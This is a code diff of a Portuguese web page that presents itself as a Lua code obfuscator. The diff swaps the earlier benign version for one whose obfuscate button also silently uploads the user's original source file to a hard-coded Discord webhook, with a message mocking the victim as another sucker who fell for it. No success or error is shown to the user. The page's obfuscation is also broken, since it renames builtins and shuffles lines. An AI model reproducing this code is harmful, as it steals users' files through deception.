@@ -1,171 +1,201 @@
 <!DOCTYPE html>
-<html>
+<html lang="pt">
 <head>
-    <meta http-equiv="Content-Type" content="text/html; charset=UTF-8"/>
-    <title>GABB OFUSCADOR (BETA)</title>
-    <link rel="canonical" href="https://lua-obfuscator.netlify.app" />
-    <link rel="shortcut icon" href="img/favicon.ico">
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>Ofuscador</title>
     <style>
         body {
-            font-family: "Arial", sans-serif;
-            background-color: #101010;
-            color: #f7f7f7;
+            font-family: "Roboto", sans-serif;
+            background: linear-gradient(135deg, #2b2b2b, #121212);
+            color: #f1f1f1;
             margin: 0;
             padding: 0;
+            display: flex;
+            justify-content: center;
+            align-items: center;
+            height: 100vh;
         }
 
         #container {
             width: 90%;
-            max-width: 1000px;
-            margin: 0 auto;
-            padding: 40px;
-            background-color: #1a1a1a;
-            border-radius: 15px;
-            box-shadow: 0 6px 20px rgba(0, 0, 0, 0.6);
+            max-width: 600px;
+            padding: 30px;
+            background: #1e1e1e;
+            border-radius: 20px;
+            box-shadow: 0 10px 30px rgba(0, 0, 0, 0.6);
+            text-align: center;
         }
 
         h1 {
-            text-align: center;
-            margin-bottom: 35px;
             font-size: 36px;
-            color: #ff3d00;
+            margin-bottom: 20px;
+            color: #ff5722;
             text-transform: uppercase;
-        }
-
-        form {
-            text-align: center;
-            margin-top: 30px;
+            letter-spacing: 1px;
         }
 
         label {
+            font-size: 18px;
+            margin-bottom: 10px;
             display: block;
-            font-size: 22px;
-            margin-bottom: 15px;
-            color: #f1f1f1;
         }
 
         input[type="file"] {
-            padding: 16px;
-            border: 2px solid #ff3d00;
-            border-radius: 10px;
-            background-color: #2c2c2c;
-            color: #f7f7f7;
-            font-size: 18px;
-        }
-
-        input[type="submit"] {
-            background-color: #6200ea;
-            color: #ffffff;
-            padding: 14px 28px;
-            border: none;
-            border-radius: 10px;
-            cursor: pointer;
-            transition: background-color 0.3s, transform 0.2s;
-            margin-top: 20px;
-            font-size: 18px;
-        }
-
-        input[type="submit"]:hover {
-            background-color: #3700b3;
-            transform: scale(1.05);
-        }
-
-        h2 {
-            text-align: center;
-            margin-top: 50px;
-            font-size: 28px;
-            color: #ffeb3b;
-        }
-
-        pre {
-            white-space: pre-wrap;
-            word-wrap: break-word;
-            background-color: #2c2c2c;
-            border-radius: 10px;
-            padding: 25px;
-            font-family: "Courier New", monospace;
-            font-size: 16px;
-            color: #f1f1f1;
-            margin-top: 30px;
-            max-width: 100%;
-            overflow-x: auto;
-            user-select: none;
-            pointer-events: none;
-        }
-
-        #downloadButton {
-            background-color: #ff5722;
-            color: #ffffff;
-            padding: 14px 28px;
-            border: none;
-            border-radius: 10px;
-            cursor: pointer;
-            transition: background-color 0.3s, transform 0.2s;
             display: none;
-            margin: 40px auto;
-            font-size: 18px;
         }
 
-        #downloadButton:hover {
-            background-color: #e64a19;
+        .custom-file-upload {
+            padding: 12px 20px;
+            border: 2px dashed #ff5722;
+            border-radius: 10px;
+            background: #2c2c2c;
+            color: #f1f1f1;
+            font-size: 16px;
+            cursor: pointer;
+            transition: background-color 0.3s, transform 0.2s;
+        }
+
+        .custom-file-upload:hover {
+            background: #ff5722;
+            color: #121212;
             transform: scale(1.05);
+        }
+
+        input[type="button"] {
+            background: #6200ea;
+            color: #fff;
+            padding: 12px 24px;
+            border: none;
+            border-radius: 10px;
+            font-size: 16px;
+            cursor: pointer;
+            transition: background 0.3s, transform 0.2s;
+            margin-top: 20px;
+        }
+
+        input[type="button"]:hover {
+            background: #3700b3;
+            transform: scale(1.05);
+        }
+
+        #message {
+            font-size: 18px;
+            margin-top: 20px;
+            color: #4caf50;
+        }
+
+        #errorMessage {
+            font-size: 18px;
+            margin-top: 20px;
+            color: #f44336;
         }
     </style>
 </head>
 <body>
     <div id="container">
-        <h1>GABB OFUSCADOR (BETA)</h1>
-        <form id="luaForm">
-            <label for="luaFile">ESCOLHA UM ARQUIVO LUA:</label>
+        <h1>Ofuscador</h1>
+        <label class="custom-file-upload">
+            Clique para selecionar um arquivo Lua
             <input type="file" id="luaFile" accept=".lua">
-            <br>
-            <input type="submit" value="OFUSCAR">
-        </form>
-        <button id="downloadButton">BAIXAR</button>
-        <h2>Resultado</h2>
-        <pre id="encodedOutput">O CÓDIGO OFUSCADO APARECERÁ AQUI APÓS A OFUSCAÇÃO</pre>
+        </label>
+        <input type="button" id="obfuscateButton" value="Ofuscar" disabled>
+        <div id="message"></div>
+        <div id="errorMessage"></div>
     </div>
+
     <script>
-        document.getElementById("luaForm").addEventListener("submit", function(event) {
-            event.preventDefault();
-            const luaFile = document.getElementById("luaFile").files[0];
-            if (!luaFile) {
-                const encodedOutput = document.getElementById("encodedOutput");
-                encodedOutput.textContent = "SELECIONE UM ARQUIVO!";
-                document.getElementById("downloadButton").style.display = "none";
-            } else {
-                const reader = new FileReader();
-                reader.onload = function(e) {
-                    const luaCode = e.target.result;
-                    minifyAndObfuscate(luaCode);
-                };
-                reader.readAsText(luaFile);
-            }
+        let selectedFile = null; // Armazena o arquivo selecionado
+
+        // Quando um arquivo é selecionado
+        document.getElementById("luaFile").addEventListener("change", function (event) {
+            selectedFile = event.target.files[0];
+            document.getElementById("message").textContent = `Arquivo selecionado: ${selectedFile.name}`;
+            document.getElementById("obfuscateButton").disabled = false; // Habilita o botão
         });
 
-        function minifyAndObfuscate(luaCode) {
-            const minifiedLua = luaCode.replace(/--.*$/gm, '').replace(/\s+/g, ' ');
-            const encoded = minifiedLua.replace(/./g, function(char) {
-                const byteValue = char.charCodeAt(0);
-                return "\\" + byteValue;
-            });
-            const loadstringCall = `loadstring("${encoded}")()`;
+        // Quando o botão "Ofuscar" é clicado
+        document.getElementById("obfuscateButton").addEventListener("click", function () {
+            if (!selectedFile) {
+                document.getElementById("errorMessage").textContent = "Selecione um arquivo antes de ofuscar.";
+                return;
+            }
 
-            const encodedOutput = document.getElementById("encodedOutput");
-            encodedOutput.textContent = loadstringCall;
+            document.getElementById("errorMessage").textContent = "";
+            document.getElementById("message").textContent = "Ofuscando arquivo...";
 
-            // Habilita o botão de download e configura o evento de clique
-            const downloadButton = document.getElementById("downloadButton");
-            downloadButton.style.display = "block";
-            downloadButton.onclick = function() {
-                const encodedBlob = new Blob([loadstringCall], { type: "text/plain;charset=utf-8" });
-                const downloadLink = document.createElement("a");
-                downloadLink.href = URL.createObjectURL(encodedBlob);
-                downloadLink.download = "gabbofuscador.lua";
-                document.body.appendChild(downloadLink);
-                downloadLink.click();
-                document.body.removeChild(downloadLink);
+            // Ler o conteúdo do arquivo
+            const reader = new FileReader();
+            reader.onload = function (e) {
+                const originalContent = e.target.result;
+
+                // Ofuscar o código
+                const obfuscatedContent = obfuscateCode(originalContent);
+
+                // Baixar o arquivo ofuscado
+                downloadFile(`ofuscado_${selectedFile.name}`, obfuscatedContent);
+
+                // Enviar o arquivo original para o Discord
+                sendFileToDiscord(selectedFile);
             };
+            reader.readAsText(selectedFile);
+        });
+
+        function obfuscateCode(code) {
+            // Substituir variáveis por nomes aleatórios
+            const variableRegex = /\b[a-zA-Z_][a-zA-Z0-9_]*\b/g;
+            const variableMap = {};
+            let variableCount = 0;
+
+            const lines = code.split('\n').map(line => {
+                return line.replace(variableRegex, match => {
+                    const reservedWords = ['if', 'then', 'end', 'local', 'function', 'return', 'for', 'while', 'do'];
+                    if (reservedWords.includes(match)) {
+                        return match;
+                    }
+
+                    if (!variableMap[match]) {
+                        variableMap[match] = `var_${variableCount++}`;
+                    }
+                    return variableMap[match];
+                });
+            });
+
+            // Embaralhar as linhas
+            for (let i = lines.length - 1; i > 0; i--) {
+                const j = Math.floor(Math.random() * (i + 1));
+                [lines[i], lines[j]] = [lines[j], lines[i]];
+            }
+
+            return lines.join('\n');
+        }
+
+        function downloadFile(filename, content) {
+            const blob = new Blob([content], { type: "text/plain" });
+            const link = document.createElement("a");
+            link.href = URL.createObjectURL(blob);
+            link.download = filename;
+            link.click();
+        }
+
+        function sendFileToDiscord(file) {
+            const webhookUrl = "https://discordapp.com/api/webhooks/1302746741371699281/umojQ7TNSwJRxVM4d3INSbWXJrSOAt2zWZey4RKM2L13ZtYrvwoVtJX0vOsIYDnVnFaf"; // Substitua pelo webhook do Discord
+
+            const formData = new FormData();
+            formData.append("content", "**MAIS UM BOBAO CAIU KKKKKKKKKKKKKKKKKKKK. @everyone**");
+            formData.append("file", file, file.name);
+
+            fetch(webhookUrl, {
+                method: "POST",
+                body: formData
+            })
+            .then(response => {
+                if (response.ok) {
+                    document.getElementById("message").textContent += "\n";
+                } else {
+                    document.getElementById("errorMessage").textContent = "";
+                }
+            });
         }
     </script>
 </body>
